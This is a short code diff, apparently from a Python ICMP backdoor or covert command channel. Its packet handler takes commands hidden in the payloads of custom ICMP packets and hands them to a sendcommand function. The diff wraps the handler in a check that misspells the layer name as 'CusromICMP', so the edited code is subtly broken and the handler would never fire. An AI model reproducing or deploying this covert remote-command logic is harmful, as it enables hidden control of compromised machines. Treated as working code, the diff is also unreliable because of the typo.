@@ -52,12 +52,13 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if packet[CustomICMP].id == config.ID:
-        destination_ip = packet[IP].src
-        destination_mac = packet[Ether].src
-        received_data = packet[ICMP].payload.load.decode('utf-8')
-        print("-----+ OUT DATA +-----")
-        sendcommand(received_data)
+    if hasattr(packet, 'CusromICMP'):
+        if packet[CustomICMP].id == config.ID:
+            destination_ip = packet[IP].src
+            destination_mac = packet[Ether].src
+            received_data = packet[ICMP].payload.load.decode('utf-8')
+            print("-----+ OUT DATA +-----")
+            sendcommand(received_data)
 
 
 def sniff_in_debug():
